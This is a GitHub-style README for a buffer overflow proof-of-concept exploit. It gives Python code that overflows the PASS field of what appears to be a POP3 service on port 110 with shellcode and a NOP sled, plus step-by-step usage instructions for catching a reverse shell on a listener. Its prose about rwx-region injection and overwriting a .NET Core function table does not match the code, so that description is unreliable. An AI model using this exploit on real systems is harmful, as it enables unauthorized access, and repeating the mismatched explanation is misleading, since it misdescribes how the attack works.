# Exploit PoC for Memory Injection Buffer Overflow 

This repository contains a proof-of-concept (PoC) exploit for a buffer overflow  in a target service. The exploit leverages a crafted buffer with a shellcode payload to gain unauthorized access to the target system.

## Disclaimer

This PoC is intended for authorized security testing and educational purposes only. Always obtain proper authorization before testing or using this exploit in any environment. The creators of this repository are not responsible for any misuse or damage caused by this exploit.

## Exploit Details

The exploit targets a buffer overflow vulnerability in a service running on a remote host. The exploit sends a crafted buffer to the target service, triggering the vulnerability and executing the shellcode. The technique involves identifying a memory region with rwx permissions, where the shellcode can be saved and executed. To achieve this, the vmmap command is used to find a suitable memory region, and then the shellcode is injected into the target process byte by byte.

After injecting the shellcode, the exploit overwrites a function pointer within the Dynamic Function Table (DFT) to trigger the execution of the shellcode. The DFT is used by the .NET Core runtime to provide helper functions for JIT compilation. By overwriting a pointer within the DFT, the control flow is redirected to the injected shellcode, resulting in its execution.

Here's the Python code for the exploit:

```python
import socket

# Set up target information
target_ip = '10.11.25.153'
target_port = 110

# Set up shellcode (use the provided shellcode or generate a new one with msfvenom)
shellcode = (
    "\xb8\x30\x3f\x27..." # Replace with the full shellcode
)

# Calculate the buffer size and return address based on the specific vulnerability
buffer_size = 2606
return_address = '\x8f\x35\x4a\x5f'

# Add NOP sled (optional, but can help improve exploit reliability)
nopsled = "\x90" * 8

# Create the final buffer with the required pattern, return address, NOP sled, and shellcode
buffer = 'A' * buffer_size + return_address + nopsled + shellcode

# Set up a socket to connect to the target
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))

# Send the exploit buffer to the target
s.send('USER username' + '\r\n')
s.send('PASS ' + buffer + '\r\n')

# Close the connection
s.close()
```

Replace `username` with a valid username for the target service (if required). This PoC exploit sends the crafted buffer to the target service, triggering the buffer overflow vulnerability and executing the shellcode.

Remember to set up a listener on your local machine (`10.11.0.41` in this case) to receive the reverse shell connection. You can use tools like `nc` or `metasploit` to create the listener.


## Usage

1. Replace the `shellcode` variable with the full shellcode for the target system.
2. Update the `target_ip` and `target_port` variables with the target system's IP address and port number.
3. Replace the `username` string with a valid username for the target service (if required).
4. Run the Python script to execute the exploit.
5. Monitor your listener for a reverse shell connection from the target system.
